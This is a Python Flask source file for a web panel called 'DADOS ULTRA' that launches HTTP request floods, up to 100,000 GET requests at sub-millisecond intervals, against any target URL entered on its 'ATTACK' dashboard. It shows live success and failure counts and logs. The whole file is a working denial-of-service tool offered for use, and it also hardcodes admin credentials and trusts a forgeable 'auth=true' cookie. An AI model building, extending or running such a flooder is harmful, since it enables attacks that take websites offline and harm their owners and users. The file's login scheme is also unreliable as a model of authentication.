from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
from datetime import datetime

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []

LOGIN = """<!DOCTYPE html><html><head><title>DADOS</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace}
.box{background:#111;padding:40px;border-radius:20px;border:2px solid red;width:350px;text-align:center;box-shadow:0 0 50px red}
h1{color:red;font-size:2em}input{width:100%;padding:15px;background:#000;border:1px solid red;border-radius:10px;color:red;margin:10px 0;font-size:14px}
.btn{width:100%;padding:15px;background:red;color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:10px}
</style></head><body>
<div class="box"><h1>💀 DADOS</h1><p style="color:#888">FAST REQUESTS</p>
<form method="post"><input type="text" name="user" placeholder="Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button class="btn" type="submit">⚡ LOGIN</button></form>
{% if error %}<p style="color:red">{{ error }}</p>{% endif %}</div></body></html>"""

DASH = """<!DOCTYPE html><html><head><title>DADOS</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0}body{background:#000;color:red;font-family:monospace;padding:15px}
.header{text-align:center;padding:20px;border:2px solid red;border-radius:15px;margin-bottom:20px;background:#111}
h1{font-size:2em;text-shadow:0 0 20px red}.card{background:#111;border:1px solid red;border-radius:10px;padding:20px;margin:15px 0}
h3{color:#f44}input,select{width:100%;padding:14px;background:#000;border:1px solid red;border-radius:8px;color:red;margin:8px 0;font-size:13px;font-family:monospace}
label{color:#888;font-size:11px}.btn{width:100%;padding:14px;background:red;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:8px 0;font-size:14px}
.btn-stop{background:#333;color:red}.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.col3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:#111;padding:15px;text-align:center;border-radius:10px;border:1px solid red}
.stat-val{font-size:2em;font-weight:bold}.s{color:#0f0}.f{color:red}.t{color:#f80}
.logs{background:#000;padding:10px;border-radius:5px;max-height:250px;overflow:auto;font-size:10px;margin-top:10px;border:1px solid #333}
.badge{padding:4px 10px;border-radius:20px;font-size:9px}.running{background:#f0020;color:red;animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:0.5}}
</style></head><body>
<div class="header"><h1>💀 DADOS ULTRA</h1><p style="color:#888">⚡ FAST DIRECT REQUESTS</p></div>
<div class="col3">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>
<div class="card"><h3>🔥 ATTACK</h3>
<div class="row"><div><label>TARGET URL</label><input id="url" placeholder="https://target.com"></div><div><label>REQUESTS</label><input type="number" id="count" value="1000"></div></div>
<label>SPEED</label><select id="speed"><option value="slow">🐢 Slow (0.1s)</option><option value="fast" selected>⚡ Fast (0.01s)</option><option value="ultra">💀 ULTRA (0.001s)</option></select>
<button class="btn" onclick="start()">🚀 LAUNCH</button><button class="btn btn-stop" onclick="stop()">⏹️ STOP</button><div id="status"></div></div>
<div class="card"><h3>📜 LOGS</h3><div class="logs" id="logs"></div></div>
<script>
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log">${x}</div>`).join('')})}
function start(){let url=document.getElementById('url').value;let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;if(!url)return alert('Enter URL!');fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge running">⚡ ATTACKING</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span style="color:#888">⏹️ Stopped</span>';l()})}
setInterval(()=>{l();u()},1000)
</script></body></html>"""

# ============================================
# ✅ SIMPLE DIRECT ATTACK (NO PROXY, NO THREADS)
# ============================================
def run_attack(attack_id, url, count, speed):
    delays = {"slow": 0.1, "fast": 0.01, "ultra": 0.001}
    delay = delays.get(speed, 0.01)
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        try:
            r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            attack_stats["success"] += 1
            attack_stats["total"] += 1
            if i % 100 == 0:
                attack_logs.append(f"✅ {attack_stats['success']} | ❌ {attack_stats['failed']} | 📊 {attack_stats['total']}")
        except:
            attack_stats["failed"] += 1
            attack_stats["total"] += 1
        
        if len(attack_logs) > 100:
            attack_logs.pop(0)
        time.sleep(delay)
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    attack_logs.append(f"🏁 DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']}")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user') == ADMIN_USER and request.form.get('pass') == ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="❌ Invalid!")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error": "Unauthorized"}), 403
    d = request.get_json()
    url = d.get('url', '')
    count = min(d.get('count', 100), 100000)
    speed = d.get('speed', 'fast')
    if not url: return jsonify({"error": "URL required"}), 400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🔥 {url} | {count} req | {speed}")
    t = threading.Thread(target=run_attack, args=(aid, url, count, speed))
    t.daemon = True; t.start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ STOPPED")
    return jsonify({"status": "stopped"})

@app.route('/logs')
def logs():
    return jsonify({"logs": [f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-30:]]})

@app.route('/stats')
def stats():
    return jsonify(attack_stats)

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
